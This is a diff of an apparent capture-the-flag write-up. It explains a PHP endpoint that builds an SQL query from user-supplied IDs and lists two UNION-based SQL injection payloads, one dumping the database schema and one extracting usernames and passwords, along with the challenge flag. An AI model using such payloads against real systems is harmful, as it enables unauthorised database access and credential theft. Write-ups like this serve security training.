@@ -39,8 +39,8 @@ if (isset($_GET['ids'])) {
 
 +the code constructs a SQL query using the user IDs and executes it using $db->query($query), where $db is an instance of a database connection object. The query selects the user_id, user_privileges, and user_name columns from the users table where the user_id is in the list of user IDs provided in the query string parameter
 + implode(): returns a string from the elements of an array.
-+ So lets try a basic sqli payload:
-payload: ,,,)) union select 1,2, sql as user_id from sqlite_master--
-output: User CREATE TABLE users ( user_id INTEGER PRIMARY KEY, user_name TEXT NOT NULL, user_privileges INTEGER NOT NULL, user_password TEXT NOT NULL ) with id 1 has no privileges.
-payload: ,,,)) union select 1,user_name,user_password from users --
-output: WEBSEC{SQL_injection_in_your_cms,_made_simple}
++ So lets try a basic sqli payload:<br>
+payload: ,,,)) union select 1,2, sql as user_id from sqlite_master--<br>
+output: User CREATE TABLE users ( user_id INTEGER PRIMARY KEY, user_name TEXT NOT NULL, user_privileges INTEGER NOT NULL, user_password TEXT NOT NULL ) with id 1 has no privileges.<br>
+payload: ,,,)) union select 1,user_name,user_password from users --<br>
+output: WEBSEC{SQL_injection_in_your_cms,_made_simple}<br>
